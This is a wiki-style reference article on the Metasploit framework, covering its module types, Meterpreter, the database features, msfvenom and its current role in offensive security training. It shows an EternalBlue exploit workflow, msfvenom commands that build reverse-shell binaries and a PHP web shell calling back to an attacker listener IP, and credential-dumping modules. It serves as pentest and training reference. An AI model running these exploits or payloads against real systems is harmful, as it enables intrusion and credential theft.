---
title: Metasploit
slug: metasploit
category: tools
summary: Metasploit is an open-source penetration testing framework providing a standardized way to develop, test, and execute exploit code against remote targets. It is the most widely-used exploit framework in offensive security training and a common reference point in penetration test workflows.
related: [nmap, active-directory, pass-the-hash]
aliases: [msf, msfconsole, Metasploit Framework]
updated: 2026-05-24
---

**Metasploit** is an open-source penetration testing framework — a programmable platform that bundles exploit modules, payloads, post-exploitation modules, and auxiliary tools into a single console. Originally created by HD Moore in 2003 and acquired by Rapid7 in 2009, it remains the most widely-used exploit framework in offensive security training and a common (though increasingly dated) reference point in real engagements.

Metasploit Framework (`msfconsole`) is free and open-source. The commercial **Metasploit Pro** adds workflow automation and reporting; few practitioners use it.

## Core concepts

Metasploit is built around a handful of resource types, all selected via the same `use` command:

| Resource | What it does |
|---|---|
| **Exploit** | Code that exploits a specific vulnerability. `windows/smb/ms17_010_eternalblue`, `linux/http/struts2_namespace_ognl`. |
| **Payload** | What runs *after* successful exploitation. Reverse shell, Meterpreter, command execution. |
| **Auxiliary** | Non-exploitation modules — scanners, brute-forcers, fuzzers, information-gathering. |
| **Post** | Post-exploitation modules — credential dumping, persistence, privilege escalation on an already-compromised host. |
| **Encoder** | Obfuscates a payload to avoid pattern-based detection. Heavily fingerprinted by modern AV. |
| **Evasion** | Newer module type focused on AV bypass at generation time. |

A typical exploit-then-run workflow:

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set RHOSTS 10.0.0.5
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 10.0.0.99
msf6 exploit(...) > run
```

`RHOSTS` is the target; `LHOST` is the attacker's listener IP; `PAYLOAD` is what executes on the target after exploitation succeeds.

## Meterpreter

Metasploit's flagship payload — a multi-stage, in-memory shell with rich post-exploitation primitives. Once a Meterpreter session lands, the operator gets:

- File upload / download
- Screenshot capture
- Keylogging
- Process listing, migration, kill
- Privilege escalation modules (`getsystem`)
- Credential extraction (`hashdump`, `kiwi`)
- Lateral movement (`portfwd`, route)
- Persistence helpers

Meterpreter loads new commands as DLLs from the attacker's host on demand, keeping the on-target footprint small.

The downside: Meterpreter is heavily signatured by every modern AV/EDR. Default Meterpreter shellcode is detected on contact in 2025. Operators bypass this with custom encoders, alternative payloads (`mingw` reverse shells, Sliver/Havoc beacons), or evasion modules — but it's no longer a turnkey "drop and run" tool.

## Working with the database

Metasploit ships with a PostgreSQL backend that stores scan results, captured credentials, exploit sessions, and notes. Useful commands:

```
msf6 > db_status         # confirm db connected
msf6 > db_nmap -A 10.0.0.0/24    # nmap output stored in db
msf6 > hosts             # list everything seen
msf6 > services -p 445   # filter to SMB services
msf6 > creds             # list captured credentials
msf6 > sessions          # active shells / Meterpreters
```

Persistent workspaces (`workspace add engagement_2025_05`) keep different engagements separated. Combined with `loot` (dumped credentials, screenshots) and reports, this makes Metasploit a usable engagement organizer even when its exploit modules aren't the primary vector.

## msfvenom — payload generation

Standalone payload generation outside msfconsole:

```bash
# Windows reverse Meterpreter as EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell (no Meterpreter — just /bin/sh)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f elf -o shell.elf

# Web shell PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f raw -o shell.php

# Encoded shellcode for C/C++ embedding
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.99 LPORT=4444 -e x64/xor -i 5 -f c
```

Combined with a listener:

```
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.0.0.99
msf6 > set LPORT 4444
msf6 > run
```

This is the canonical exfiltrate-the-shell-out flow taught in CEH and most foundational courses.

## Where Metasploit fits in 2025

Modern offensive security has moved past Metasploit as a primary exploitation tool in two ways:

1. **Beacons over shells.** Cobalt Strike, Sliver, Havoc, and Mythic provide superior C2 with low-and-slow defaults, signed-binary loaders, and built-in pivoting. Meterpreter is operationally noisy.
2. **AV/EDR signatures.** Default Metasploit payloads are detected universally. Real engagements custom-roll initial access; Metasploit may still be used for exploit-after-foothold on internal services.

However, Metasploit retains real value as:

- **A learning tool.** The exploit modules are readable Ruby. Walk through an exploit module to understand what the underlying vulnerability is — far better than a CVE description alone.
- **A CTF tool.** TryHackMe and HackTheBox boxes routinely include known-vulnerable services. Metasploit lands them quickly.
- **A reconnaissance + database backbone.** Even when not exploiting, `db_nmap` + workspace tracking is a usable engagement organizer.

## Common modules worth knowing

| Module | Purpose |
|---|---|
| `exploit/windows/smb/ms17_010_eternalblue` | EternalBlue SMB RCE. |
| `exploit/multi/handler` | Generic listener for an arbitrary payload. |
| `auxiliary/scanner/smb/smb_enumshares` | List SMB shares on a target. |
| `auxiliary/scanner/snmp/snmp_login` | Brute-force SNMP community strings. |
| `post/windows/gather/hashdump` | Dump SAM hashes from a Meterpreter session. |
| `post/multi/recon/local_exploit_suggester` | Suggest privilege-escalation modules based on the target's OS / kernel. |

## Further reading

- [Metasploit Unleashed (free official training)](https://www.offsec.com/metasploit-unleashed/) — by OffSec, the canonical Metasploit course.
- [Metasploit GitHub](https://github.com/rapid7/metasploit-framework).
- [Rapid7 Metasploit docs](https://docs.rapid7.com/metasploit/).
